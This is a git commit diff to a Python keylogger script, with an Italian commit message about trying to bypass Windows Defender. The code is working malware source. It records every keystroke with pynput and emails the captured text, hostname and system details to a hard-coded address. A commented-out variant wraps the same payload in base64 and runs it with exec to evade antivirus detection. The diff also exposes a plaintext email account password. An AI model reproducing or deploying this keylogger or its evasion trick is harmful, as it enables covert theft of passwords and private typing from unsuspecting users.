c1600025d54f6d16d7ae0913a9eb2c88adfb6c7b
Alessandro Rotili <a.rotili94@gmail.com>
2022-10-11 19:01:26 +0200

    Update Keylogger
    Update del keylogger con un tentativo di bypass di windows defender(commentato)

--- keylogger/keylogger/keylogger.py
+++ keylogger/keylogger/keylogger.py
@@ -1,17 +1,14 @@
-
-
 from cryptography.fernet import Fernet
 import base64
-
-your_code = base64.b64encode(b"""import pynput
+import pynput
 from pynput.keyboard import Listener, Key
 import socket as s
 import email
 import yagmail
 import datetime as dt
 import platform as p
-today=dt.datetime.now().strftime('%Y-%m at %H:%M')
-r=(\n)*4
+today=dt.datetime.now().strftime('%Y-%m-%d at %H:%M')
+r=("\n")*4
 
 class Email:
     def __init__(self,email):
@@ -59,9 +56,66 @@ with Listener(on_press = press, on_release = release) as listener:
 print(TestoEmail.testo)   
 TestoEmail.testo
 sendemail.send_email(TestoEmail.testo.replace("'","")) 
-""")
 
-exec(base64.b64decode(your_code))
+# your_code = base64.b64encode(b"""import pynput
+# from pynput.keyboard import Listener, Key
+# import socket as s
+# import email
+# import yagmail
+# import datetime as dt
+# import platform as p
+# today=dt.datetime.now().strftime('%Y-%m at %H:%M')
+# r=(\n)*4
+
+# class Email:
+#     def __init__(self,email):
+#         self.email=email
+
+#     def send_email(self,testo):
+#         self.testo=testo
+#         email= yagmail.SMTP(user='dariojava99', password='peqhxybjekikvqjn')
+#         email.send(to=self.email, subject= "Here's what " + s.gethostname() + " typed", 
+#                     contents=self.testo +"\n"+
+#                     r+str(p.platform())+"\n" +
+#                     str(p.uname()) + "\n" +
+#                     today)
+
+
+# sendemail = Email("a.rotili94@gmail.com")
+
+# class TestoEmail:
+#     testo = ""
+
+#     def aggiungiStringa(keyChar):
+#         return keyChar
+
+# def press(key):
+#     if key == Key.space:
+#         TestoEmail.testo +=" "
+#     elif key == Key.enter:
+#         TestoEmail.testo += "\n" 
+#     elif key == Key.shift:
+#         TestoEmail.testo += "" 
+#     elif key == Key.backspace:
+#         TestoEmail.testo = TestoEmail.testo[:-2]       
+#     else:    
+#         TestoEmail.testo += TestoEmail.aggiungiStringa(str(key))  
+#     print(key)
+
+
+# def release(key):
+#     if key == Key.esc:
+#         return False
+
+# with Listener(on_press = press, on_release = release) as listener:
+#     listener.join()
+
+# print(TestoEmail.testo)   
+# TestoEmail.testo
+# sendemail.send_email(TestoEmail.testo.replace("'","")) 
+# """)
+
+# exec(base64.b64decode(your_code))
 
 # key = Fernet.generate_key()
 # encryption_type = Fernet(key)
